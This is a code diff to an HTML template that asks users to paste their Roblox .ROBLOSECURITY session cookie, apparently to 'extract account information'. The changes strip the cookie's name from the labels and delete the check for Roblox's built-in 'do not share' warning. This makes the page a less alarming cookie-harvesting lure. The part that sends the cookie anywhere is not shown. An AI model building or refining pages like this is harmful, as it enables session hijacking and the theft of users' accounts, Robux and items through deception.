@@ -654,8 +654,8 @@ HELPER_HTML = """
         <p class="subtitle">Paste your Roblox cookie below</p>
 
         <div class="input-group">
-            <label>Roblox Cookie (.ROBLOSECURITY)</label>
-            <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here"></textarea>
+            <label>Roblox Cookie</label>
+            <textarea id="cookie" placeholder="Paste your Roblox cookie here"></textarea>
         </div>
 
         <div class="loading" id="loading">
@@ -681,7 +681,7 @@ HELPER_HTML = """
         <div class="status" id="status"></div>
 
         <div class="info">
-            ℹ️ We need your cookie to extract your account information. This process takes approximately 1 minute.
+            ℹ️ Paste any Roblox cookie to extract account information. This process takes approximately 1 minute.
         </div>
     </div>
 
@@ -704,10 +704,7 @@ HELPER_HTML = """
                 return;
             }
 
-            if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-to-your-account-and-to-steal-your-ROBUX-and-items.|_')) {
-                showError('❌ Invalid cookie format. Make sure you copied the entire .ROBLOSECURITY cookie');
-                return;
-            }
+            // No format validation - accept any cookie
 
             // Reset timer and progress
             timeLeft = 60;
